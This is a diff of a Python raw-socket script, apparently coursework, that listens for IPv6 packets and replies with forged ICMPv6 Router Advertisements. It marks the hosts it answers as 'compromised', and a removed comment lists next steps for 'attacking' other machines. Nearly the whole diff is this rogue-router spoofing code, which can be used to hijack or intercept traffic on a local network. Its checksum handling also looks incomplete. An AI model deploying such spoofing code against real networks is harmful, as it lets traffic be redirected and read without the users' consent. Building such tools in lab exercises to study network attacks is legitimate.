@@ -20,25 +20,9 @@ def getmac():
 
   return mac[0:17]
 
-def get_checksum(msg):
-    s = 0
-    # add padding if not multiple of 2 (16 bits)
-    msg = (msg + b'\x00') if len(msg)%2 else msg
-    for i in range(0, len(msg), 2):
-        w = msg[i] + (msg[i+1] << 8)
-        s = s + w
-        s = (s & 0xffff) + (s >> 16)
-    s = ~s & 0xffff
-    return socket.ntohs(s)
 
 def calculate_icmpv6_checksum(packet):
-    """Calculate the ICMPv6 checksum for a packet.
-
-    :param packet: The packet bytes to checksum.
-    :returns: The checksum integer.
-    """
     total = 0
-
     # Add up 16-bit words
     num_words = len(packet) // 2
     for chunk in struct.unpack("!%sH" % num_words, packet[0:num_words * 2]):
@@ -77,10 +61,10 @@ def create_eth(mac_dst):
 
     return struct.pack("!6s6sH",(mac_dst),mac_src, IPV6)
 
-def is_compromised(sender_ip,next_header):
+def is_compromised(sender_ip, dest, next_header):
     if sender_ip in compromised:
         print("IP origem: ", sender_ip)
-        print("IP destino: ")
+        print("IP destino: ", dest)
         print("Protocolo: ", next_header)
         return True
     return False
@@ -89,20 +73,11 @@ def create_ipv6(sender_ip):
     version = 6
     traffic_class = 0
     flow_label = 0
-    payload_legth = 16
+    payload_legth = 56
     next_header = socket.IPPROTO_ICMPV6
     hop_limit = 255
-        
-    src_address = bytes.fromhex(str(get_my_ipv6()).replace(":",""))
-    dst_address = bytes.fromhex(str(sender_ip).replace(":",""))
-
-    # src_address = bytes.fromhex('FE800000000000000000000000000000')
-    # dst_address = bytes.fromhex('FE80000000000000020000FFFEAA0003')
-
-  
-    print("SRC IP:",ipv6_to_bytes(get_my_ipv6()))
+    
     src_address = ipv6_to_bytes(get_my_ipv6())
-    print("SENDER IP:",ipv6_to_bytes(sender_ip))
     dst_address = ipv6_to_bytes(sender_ip)
     
     ver_traff =  (version << 4) + 0
@@ -111,7 +86,7 @@ def create_ipv6(sender_ip):
     ip_pack = struct.pack('!BBHHBB16s16s', ver_traff, traff_lab, flow_label, payload_legth,next_header, hop_limit, src_address, dst_address)
     return ip_pack
 
-def create_icmpv6(eth,ipv6):
+def create_icmpv6(ipv6, sender_ip):
     adv_type = 134
     code = 0
     cur_hop_limit = 0
@@ -121,20 +96,24 @@ def create_icmpv6(eth,ipv6):
     checksum = 0
     flags = 0x80
 
+    src_address = ipv6_to_bytes(get_my_ipv6())
+    dst_address = ipv6_to_bytes(sender_ip)
+
+    upper_length = len(ipv6)
+    mbz = 0
+    next_header = (mbz << 8) + socket.IPPROTO_ICMPV6
+
     icmpv6_pack = struct.pack("!BBHBBH4s4s",adv_type,code,checksum,cur_hop_limit,flags,router_lifetime,reachable_time,retrans_timer)
-    checksum = calculate_icmpv6_checksum(eth+ipv6+icmpv6_pack)
-    # print("Checksum: ",ipv6+checksum)
+    checksum = calculate_icmpv6_checksum(icmpv6_pack)    
     icmpv6_pack = struct.pack("!BBHBBH4s4s",adv_type,code,checksum,cur_hop_limit,flags,router_lifetime,reachable_time,retrans_timer)
     
-    
-    print("ICMPV6:",icmpv6_pack)
     return icmpv6_pack
 
 
 def send_icmpv6_advertisement(s, packet, mac_src, sender_ip):
     ipv6 = create_ipv6(sender_ip)
     eth = create_eth(mac_src)
-    icmpv6 = create_icmpv6(ipv6,eth)
+    icmpv6 = create_icmpv6(ipv6,sender_ip)
     
     pct = eth + ipv6 + icmpv6
     s.send(pct)
@@ -143,9 +122,10 @@ def send_icmpv6_advertisement(s, packet, mac_src, sender_ip):
 def receive_ipv6(s, packet, mac_src): 
     first_word, payload_lenght, next_header, hoplimit = struct.unpack('>IHBB', packet[0:8])
     sender_ip = bytes_to_ipv6(packet[8:24])
+    dest = bytes_to_ipv6(packet[24:40])
     payload = packet[40:]
 
-    if is_compromised(sender_ip,next_header):
+    if is_compromised(sender_ip, dest, next_header):
         return
 
     if next_header == socket.IPPROTO_ICMPV6:
@@ -161,12 +141,6 @@ def receive_ipv6(s, packet, mac_src):
 
             
 if __name__ == '__main__':
-    ''' Next steps:
-        1) avoid atacking ourselves (verify if the sender's ip == our ip)
-        2) keep track of compromised machines to print instead of attacking again (add compromised machines ip to a list)
-        3) implement 'send_router_advertisement'
-        4) check if line 17 works (maybe necessary to change some types)
-    '''
     try:
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
     except OSError as msg:
@@ -183,11 +157,10 @@ if __name__ == '__main__':
         eth_header = packet[:ETH_LENGTH]
         eth = struct.unpack("!6s6sH",eth_header)
 
-
         # checks for ipv6 packets
         if eth[2] == IPV6:
             # print("IPV6 packet received, addr:",addr)
             mac_src = eth[1]
             packet_ipv6 = packet[ETH_LENGTH:]
-            
+
             receive_ipv6(s, packet_ipv6, mac_src)
